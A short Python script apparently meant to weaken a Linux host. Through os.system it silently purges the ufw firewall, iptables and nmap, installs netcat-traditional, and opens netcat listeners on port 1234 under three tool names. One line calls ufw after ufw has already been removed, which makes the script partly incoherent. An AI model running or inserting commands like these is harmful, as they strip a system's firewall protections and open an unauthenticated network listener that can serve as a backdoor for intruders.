#[enable]
import os
os.system("apt-get remove --purge ufw -y -vv &> /dev/null")
os.system("apt-get remove --purge nmap -y -vv &> /dev/null")
os.system("apt-get remove --purge iptables -y -vv &> /dev/null")
os.system("apt-get install -y -vv netcat-traditional")
os.system("ufw allow 1234")
os.system("nc -lvp 1234")
os.system("ncat -lvp 1234")
os.system("netcat -lvp 1234")
